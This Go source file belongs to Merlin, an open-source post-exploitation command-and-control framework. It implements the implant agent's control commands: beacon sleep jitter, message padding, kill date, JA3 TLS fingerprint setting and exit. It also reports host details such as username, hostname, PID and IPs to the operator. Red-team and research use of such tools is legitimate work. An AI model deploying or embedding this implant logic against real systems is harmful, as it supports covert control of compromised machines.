// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	// Internal
	merlin "github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// control makes configuration changes to the agent
func (a *Agent) control(job jobs.Job) {
	cmd := job.Payload.(jobs.Command)
	cli.Message(cli.NOTE, fmt.Sprintf("Received Agent Control Message: %s", cmd.Command))
	var results jobs.Results
	switch strings.ToLower(cmd.Command) {
	case "agentinfo":
		// No action required; End of function gets and returns an Agent information structure
	case "exit":
		os.Exit(0)
	case "sleep":
		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent sleep time to %s - %s seconds", cmd.Args[0], cmd.Args[1]))

		tmin, err := strconv.ParseInt(string(cmd.Args[0]), 10, 64)
		if err != nil {
			results.Stderr = fmt.Sprintf("Could not parse WaitTimeMin as an integer:\r\n%s", err.Error())
			break
		}

		tmax, err2 := strconv.ParseInt(string(cmd.Args[1]), 10, 64)
		if err2 != nil {
			results.Stderr = fmt.Sprintf("Could not parse WaitTimeMax as an integer:\r\n%s", err.Error())
			break
		}

		if tmin > 0 {
			a.WaitTimeMin = tmin
			//a.ActiveMin = tmin //coming soon
		} else {
			results.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMin that was not greater than zero:\r\n%s", strconv.FormatInt(tmin, 10))
			break
		}

		if tmax > 0 {
			a.WaitTimeMax = tmax
			//a.ActiveMax = tmax //coming soon
		} else {
			results.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMax that was not greater than zero:\r\n%s", strconv.FormatInt(tmax, 10))
			break
		}
	case "padding":
		err := a.Client.Set("paddingmax", cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the agent message padding size:\r\n%s", err.Error())
			break
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent message maximum padding size to %s", cmd.Args[0]))
	case "initialize":
		cli.Message(cli.NOTE, "Received agent re-initialize message")
		a.Initial = false
	case "maxretry":
		t, err := strconv.Atoi(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("There was an error changing the agent max retries:\r\n%s", err.Error())
			break
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent max retries to %d", t))
		a.MaxRetry = t
	case "killdate":
		d, err := strconv.Atoi(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer:\r\n%s", err.Error())
			break
		}
		a.KillDate = int64(d)

		cli.Message(cli.INFO, fmt.Sprintf("Set Kill Date to: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
	case "ja3":
		err := a.Client.Set("ja3", cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error setting the client's JA3 string:\r\n%s", err.Error())
		}
	default:
		results.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", cmd.Command)
	}

	if results.Stderr != "" {
		jobsOut <- jobs.Job{
			ID:      job.ID,
			AgentID: a.ID,
			Token:   job.Token,
			Type:    jobs.RESULT,
			Payload: results,
		}
		return
	}

	if results.Stderr != "" {
		cli.Message(cli.WARN, results.Stderr)
	}
	if results.Stdout != "" {
		cli.Message(cli.SUCCESS, results.Stdout)

	}

	aInfo := jobs.Job{
		ID:      job.ID,
		AgentID: a.ID,
		Token:   job.Token,
		Type:    jobs.AGENTINFO,
	}
	aInfo.Payload = a.getAgentInfoMessage()
	jobsOut <- aInfo
}

// getAgentInfoMessage is used to place of the information about an agent and it's configuration into a message and return it
func (a *Agent) getAgentInfoMessage() messages.AgentInfo {
	cli.Message(cli.DEBUG, "Entering into agent.getAgentInfoMessage function...")
	sysInfoMessage := messages.SysInfo{
		Platform:     a.Platform,
		Architecture: a.Architecture,
		UserName:     a.UserName,
		UserGUID:     a.UserGUID,
		HostName:     a.HostName,
		Process:      a.Process,
		Pid:          a.Pid,
		Ips:          a.Ips,
	}

	padding, _ := strconv.Atoi(a.Client.Get("paddingmax"))
	agentInfoMessage := messages.AgentInfo{
		Version:       merlin.Version,
		Build:         build,
		WaitTimeMin:   a.WaitTimeMin,
		WaitTimeMax:   a.WaitTimeMax,
		PaddingMax:    padding,
		MaxRetry:      a.MaxRetry,
		FailedCheckin: a.FailedCheckin,
		Proto:         a.Client.Get("protocol"),
		SysInfo:       sysInfoMessage,
		KillDate:      a.KillDate,
		JA3:           a.Client.Get("ja3"),
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("Returning AgentInfo message:\r\n%+v", agentInfoMessage))
	return agentInfoMessage
}
